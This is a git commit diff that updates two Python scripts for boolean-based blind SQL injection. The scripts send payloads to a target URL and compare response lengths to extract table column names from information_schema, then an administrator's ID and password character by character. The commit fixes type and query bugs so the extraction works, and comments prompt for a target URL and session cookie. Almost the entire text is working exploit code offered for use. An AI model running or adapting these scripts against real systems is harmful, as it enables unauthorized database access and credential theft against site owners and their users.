e28abd3de6b287ae676a51efb6fbcf7ddea0a79f
WinterMute1000 <42152852+WinterMute1000@users.noreply.github.com>
2020-10-30 20:26:04 +0900

    Update Query
    it work well. I recommand fix this script that to use thread If you want.

--- Project/Script/blind_sql_injection_get_admin_info.py
+++ Project/Script/blind_sql_injection_get_admin_info.py
@@ -2,26 +2,26 @@
 """
 Created on Thu Oct 29 14:30:05 2020
 
-@author: User
+@author: WinterMute1000
 """
 
 import requests
-DEFAULT_URL="http://127.0.0.1/"#Input Target URL
+DEFAULT_URL="http://127.0.0.1"
 TRUE_RES=len(requests.get(DEFAULT_URL+"%27+AND+%271%27%3D%271%27+--+").text)
 #TRUE_RES==different html length
-KNOWN_TABLE_NAME="table_db" #Input table name
+KNOWN_TABLE_NAME="admin_tb" #Input Your Target table
 
 def get_admin_id():
     admin_id=''
     for admin_id_length in range(1,31): # get admin_id length
-        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+length%28select+admin_id+from
+        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+%28select+length%28admin_id%29+from
                                      +"""+KNOWN_TABLE_NAME+"+limit+0%2C1"
-                                     +"%29%3D"+admin_id_length+"+--+").text): #Input id column name
-           for id_idx in range(0,admin_id_length):
+                                     +"%29%3D"+str(admin_id_length)+"+--+").text):
+           for id_idx in range(0,admin_id_length+1):
                for ascii_code in range(32,127): #get one character columns name
                    if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28substr%28%28select+admin_id+from
-                                      +"""+KNOWN_TABLE_NAME+"""+limit+0%2C1%29%2C"""+id_idx+
-                                      """%2C1%29%29%3D"""+str(ascii_code)+"+--+").text):#Input id column name
+                                      +"""+KNOWN_TABLE_NAME+"""+limit+0%2C1%29%2C"""+str(id_idx)+
+                                      """%2C1%29%29%3D"""+str(ascii_code)+"+--+").text):
                        
                        admin_id=admin_id+chr(ascii_code)
            break
@@ -29,19 +29,19 @@ def get_admin_id():
 
 def get_admin_passwd():
     admin_passwd=''
-    for admin_passwd_length in range(1,50): # get columns name length
-        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+length%28select+admin_passwd+from
-                                     +"""+KNOWN_TABLE_NAME+"+limit+0%2C1" #Input password column name
-                                     +"%29%3D"+admin_passwd_length+"+--+").text):
-           for passwd_idx in range(0,admin_passwd_length):
+    for admin_id_length in range(1,50): # get admin_id length
+        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+%28select+length%28admin_pass%29+from
+                                     +"""+KNOWN_TABLE_NAME+"+limit+0%2C1"
+                                     +"%29%3D"+str(admin_id_length)+"+--+").text):
+           for id_idx in range(0,admin_id_length+1):
                for ascii_code in range(32,127): #get one character columns name
-                   if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28substr%28%28select+admin_passwd+from
-                                      +"""+KNOWN_TABLE_NAME+"""+limit+0%2C1%29%2C"""+passwd_idx+
-                                      """%2C1%29%29%3D"""+str(ascii_code)+"+--+").text):#Input password column name
+                   if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28substr%28%28select+admin_pass+from
+                                      +"""+KNOWN_TABLE_NAME+"""+limit+0%2C1%29%2C"""+str(id_idx)+
+                                      """%2C1%29%29%3D"""+str(ascii_code)+"+--+").text):
+                       
                        admin_passwd=admin_passwd+chr(ascii_code)
            break
     return admin_passwd
-
 
 if __name__=="__main__":
     print("admin id:"+get_admin_id())
--- Project/Script/blind_sql_injection_get_columns_info.py
+++ Project/Script/blind_sql_injection_get_columns_info.py
@@ -6,19 +6,16 @@ Created on Wed Oct 28 20:03:11 2020
 """
 
 import requests
-DEFAULT_URL="http://127.0.0.1/" #Insert your target url
-TRUE_RES=len(requests.get(DEFAULT_URL+"%27+AND+%271%27%3D%271%27+--+").text)
+DEFAULT_URL="http://127.0.0.1" #Please input your target URL
+COOKIES={'cookies':'cookies'} #Input Cookie
+TRUE_RES=len(requests.get(DEFAULT_URL+"%27+AND+%271%27%3D%271%27+--+",cookies=COOKIES).text)
 #TRUE_RES==different html length
-KNOWN_TABLE_NAME="tb" #input table name
+KNOWN_TABLE_NAME="admin_tb" #Please input your target table
 
 def get_columns_num():
     for i in range(1,21):
-        if TRUE_RES==len(requests.get(DEFAULT_URL+
-                                 """%27+and+%28select+count%28column_name%29+from+information_schema.columns+
-                                 where+table_name%3D%27"""+
-                                 KNOWN_TABLE_NAME+
-                                 "%27%29+%3D"+i+"+--+").text):
-            print("Columns num:"+i)
+        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27+and+%28select+count%28column_name%29+from+information_schema.columns+where+table_name%3D%27"""+KNOWN_TABLE_NAME+"%27%29+%3D"+str(i)+"+--+",cookies=COOKIES).text):
+            print("Columns num:"+str(i))
             return i;
     
     print("Columns num over 20")
@@ -28,18 +25,11 @@ def get_columns_name(columns_num):
     columns_name_list=['']*columns_num
     for idx in range(0,columns_num):
         for column_name_length in range(1,31): # get columns name length
-            if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28select+column_name+from
-                                          +information_schema.columns+WHERE+table_name%3D%27"""+
-                                          KNOWN_TABLE_NAME+"%27+limit+"+str(idx)+
-                                      "%2C"+str(idx+1)+"%29%3D"+column_name_length+"+--+").text):
-                for column_name_idx in range(0,column_name_length):
+            if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+%28select+length%28column_name%29+from+information_schema.columns+WHERE+table_name%3D%27"""+KNOWN_TABLE_NAME+"%27+order+by+1+limit+"+str(idx)+"%2C1%29%3D"+str(column_name_length)+"+--+",cookies=COOKIES).text):
+                for column_name_idx in range(0,column_name_length+1):
                     for ascii_code in range(32,127): #get one character columns name
-                        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28substr%28%28select+column_name+from
-                                      +information_schema.columns+WHERE+table_name%3D%27"""+
-                                      KNOWN_TABLE_NAME+"%27+limit+"+str(idx)+
-                                      "%2C"+str(idx+1)+"%29%2C"+column_name_idx+"%2C1%29%29%3D"+
-                                          ascii_code+"+--+").text):
-                            columns_name_list[idx].append(chr(ascii_code))
+                        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28substr%28%28select+column_name+from+information_schema.columns+WHERE+table_name%3D%27"""+KNOWN_TABLE_NAME+"%27+order+by+1+limit+"+str(idx)+"%2C"+str(1)+"%29%2C"+str(column_name_idx)+"%2C1%29%29%3D"+str(ascii_code)+"+--+",cookies=COOKIES).text):
+                            columns_name_list[idx]=columns_name_list[idx]+chr(ascii_code)
                 break
             
     print(columns_name_list)
